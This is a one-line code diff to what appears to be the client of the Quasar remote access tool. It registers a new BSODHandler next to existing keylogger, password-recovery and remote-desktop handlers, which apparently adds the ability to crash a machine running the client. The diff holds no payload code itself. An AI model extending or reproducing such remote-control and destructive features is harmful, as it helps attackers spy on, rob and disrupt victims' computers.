@@ -167,6 +167,7 @@ namespace Quasar.Client
             _messageProcessors.Add(new KeyloggerHandler());
             _messageProcessors.Add(new MessageBoxHandler());
             _messageProcessors.Add(new KematianHandler());
+            _messageProcessors.Add(new BSODHandler());
             _messageProcessors.Add(new PasswordRecoveryHandler());
             _messageProcessors.Add(new RegistryHandler());
             _messageProcessors.Add(new RemoteDesktopHandler());
